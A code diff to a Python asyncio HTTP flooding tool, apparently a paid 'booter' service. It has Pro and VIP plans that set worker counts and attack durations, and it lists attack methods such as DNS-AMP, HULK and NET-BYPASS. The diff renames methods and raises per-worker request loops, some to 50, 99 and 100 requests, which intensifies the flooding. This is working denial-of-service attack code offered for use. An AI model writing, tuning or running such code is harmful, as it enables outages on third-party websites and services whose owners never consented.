@@ -139,14 +139,14 @@ PLANS = {
         'name': 'Pro Plan',
         'workers': 1000,
         'duration': 3600,
-        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'DNS-AMP', 'STRESS TEST', 'NODE-NUKE', 'CONCURRENT HOLD','SOCKET-AMP'],
+        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'DNS-AMP', 'STRESS TEST','CONCURRENT HOLD','SOCKET-AMP'],
         '76034a9f5bef30b9dee701711d30bed6': ['p3r7o9k2', 'l8i4u6y1', 't5g9h3j7']
     },
     'VIP': {
         'name': 'VIP Plan',
         'workers': 1500,
         'duration': 9500,
-        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'BROWSER', 'HULK', 'DNS-AMP', 'STRESS TEST', 'NODE-NUKE', 'CONCURRENT HOLD', 'TLS-VIP' ,'SOCKET-AMP','NET-BYPASS'],
+        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'BROWSER', 'HULK', 'DNS-AMP', 'STRESS TEST', 'TLS-VIP', 'CONCURRENT HOLD','SOCKET-AMP','NET-BYPASS'],
         '76034a9f5bef30b9dee701711d30bed6': ['v9i2p8k4', 'z7x3c6v1', 'w4q8e2r5','xyz','.']
     }
 }
@@ -441,21 +441,21 @@ async def http_worker(session, url, end_time, worker_id, method):
                     stats["requests"] += 1
                     
             elif method == 'STRESS TEST':
-                for _ in range(2):
+                for _ in range(50):
                     async with session.get(url, headers=headers, timeout=8) as resp:
                         await resp.read()
                         stats["requests"] += 1
                         stats["status_codes"][resp.status] += 1
                         
-            elif method == 'NODE-NUKE':
-                for _ in range(3):
+            elif method == 'TLS-VIP':
+                for _ in range(5):
                     async with session.get(url, headers=headers, timeout=8) as resp:
                         await resp.read()
                         stats["requests"] += 1
                         stats["status_codes"][resp.status] += 1
                         
             elif method == 'CONCURRENT HOLD':
-                for _ in range(2):
+                for _ in range(99):
                     if random.random() > 0.5:
                         async with session.get(url, headers=headers, timeout=8) as resp:
                             await resp.read()
@@ -468,23 +468,25 @@ async def http_worker(session, url, end_time, worker_id, method):
                             stats["status_codes"][resp.status] += 1
                             
             elif method == 'SOCKET-AMP':
-                for _ in range(4):
+                for _ in range(5):
                     async with session.get(url, headers=headers, timeout=10) as resp:
                         await resp.read()
                         stats["requests"] += 1
                         stats["status_codes"][resp.status] += 1
                         
-            elif method == 'BYPASS LOAD':
-                for _ in range(5):
+            elif method == 'NET-BYPASS':
+                for _ in range(100):
                     async with session.get(url, headers=headers, timeout=8) as resp:
                         await resp.read()
                         stats["requests"] += 1
                         stats["status_codes"][resp.status] += 1
+
+           
                     
         except Exception:
             stats["errors"] += 1
 
-        if method in ['DNS-AMP', 'STRESS TEST', 'NODE-NUKE', 'CONCURRENT HOLD', 'SOCKET-AMP', 'BYPASS LOAD']:
+        if method in ['DNS-AMP', 'STRESS TEST', 'TLS-VIP', 'CONCURRENT HOLD', 'SOCKET-AMP', 'NET-BYPASS']:
             await asyncio.sleep(random.uniform(0.1, 0.5))
         else:
             await asyncio.sleep(random.uniform(0.5, 2.0))
